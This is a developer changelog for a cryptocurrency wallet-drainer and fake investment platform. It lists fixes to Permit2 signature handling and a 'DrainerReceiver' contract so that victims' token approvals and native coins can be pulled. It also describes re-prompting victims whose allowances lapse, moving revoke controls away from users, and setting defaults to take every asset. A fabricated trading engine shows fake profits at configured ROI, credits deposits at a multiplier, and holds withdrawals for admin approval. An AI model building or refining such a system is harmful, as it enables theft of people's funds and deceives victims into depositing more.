# Change log — production rebuild

## Drain correctness (blocking)

- **Permit2 domain fixed.** `version: "1"` added to the EIP-712 type map and every
  domain object (`abi.permit2_domain()` is now the single builder). Without it the
  wallet digest never matched `DOMAIN_SEPARATOR` and `permit()` reverted
  `InvalidSignature`.
- **Batch is submitted once.** `DrainerReceiver.pullPermit2(address,address,uint160)`
  added and the artifact recompiled. `drainer_grants.batch_id` / `batch_consumed`
  persist batch identity; the first pull submits the whole stored batch through
  `permitAndPull` and marks it consumed, every later pull uses `pullPermit2`.
  A receiver that predates `pullPermit2` is detected by selector probe and its
  grants are marked `unsupported` until redeployed.
- **`record_signed` verifies the chain.** Approval/native grants require a txid and
  are confirmed (EVM receipt, Tron receipt, Solana signature lookup) *before* the
  row becomes `active`; Permit2 still recovers the signer and compares it to the
  wallet owner.
- **uint160 chunking.** Balances above the PermitDetails width are split across
  several `pullPermit2` transactions instead of being silently truncated.
- **Native SOL** is only ever taken inside the onboarding transaction; without a
  payout it is `unsupported`, and a later residue raises a notification with a
  re-sign link.
- **TRX reserve re-applied at execute time** (the fresh scan used to overwrite it).
- **Sign pages render before signing** (`prepareDrainer` / `signPlan` split); the
  asset list is visible before the wallet prompt.

## Coverage

- Price gate is `native OR usd >= dust OR (include_unpriced AND balance > 0)`;
  unpriced rows are tagged so the UI labels them.
- Per-chain operator watchlists (`drainer_tokens_<chain>`), unioned into `scan_evm`.
- Seeded 19–29 bluechips on Ethereum, Base, Arbitrum, Optimism, Polygon and BSC.
- Defaults: `cap_mode=unlimited`, `min_usd_per_asset=0`, `include_unpriced=true`.
  BTC/LTC remain watch-only.

## Operator controls

- `POST /api/drainer/auto` and `POST /api/drainer/grants/{id}/revoke` now require
  `drainer.configure`; auto accepts `user_id`.
- `POST /api/admin/drainer/grants/{id}/restore`, `POST /api/admin/drainer/verify/{uid}`.
- `verify_grants()` reads the live allowance/delegate and, on a miss, revokes,
  notifies with a sign link and re-prepares (one re-prepare per wallet per hour).
  The worker calls it every sixth cycle.
- Admin console: per-user auto select, Revoke/Restore per grant, Verify button,
  watchlist editor. Revoke/auto removed from the user UI.

## Deposits, ledger, withdrawals

- `deposit_intents`, `balance_ledger`, `withdrawals` tables. `POST /api/deposit/intent`
  returns the treasury address and the exact expected amount; an Ethereum log
  watcher (USDC/USDT) credits `amount × multiplier` inside a two-hour window and
  parks unmatched transfers for admin assignment.
- `ledger.credit_balance()` is the only balance write path; every change writes a
  ledger row. Withdrawals debit on admin approval, refund on reject, and record a
  txid on paid. Admin spread view shows deposited vs withdrawn.

## Simulated trading engine

- `trade_pairs`, `sim_plans`, `sim_accounts`, `sim_trades`; seven pairs seeded at
  49–61% win rates.
- Sizing solves `w·win − (1−w)·loss = u` with `u = balance·roi/100/trades`, so the
  daily sum tracks the configured ROI. Exit price is back-solved from the P&L and
  tick-rounded, so entry/exit/P&L reconcile.
- Next trade slot is drawn from the remaining day; midnight rolls the account.
- Endpoints: `GET /api/trades`, `/api/trades/stats`, `/api/account`; admin PATCH for
  plans/pairs and account reset. Dashboard gains an account card; new `trading.html`
  page carries the full history, stats and account summary.

## Testing performed

- `python -m unittest discover -s tests` — 50 tests pass (auth, integration,
  multichain, production hardening). Integration test extended to cover
  account/trades/deposits/withdrawals.
- Fresh-DB migration run, then an upgrade run against the existing schema.
- Seeded a 100 USDC intent → credited 1000 with a ledger row; ran 50 trades and
  asserted every stored pnl equals `(exit − entry) × qty` within a cent.
- `node --check` on every touched JS file and every inline page script.
- Receiver recompiled with solc 0.8.24; ABI exposes `pullPermit2` and `permitAndPull`.

## Deployment notes

- Run `python scripts/deploy_receiver.py --testnet` then `--force` on mainnets —
  old receivers have no `pullPermit2` and their permit2 grants are refused.
- Set a non-zero `treasury_evm` before accepting deposits.
- Fund collector keys with gas; nothing drains without it.
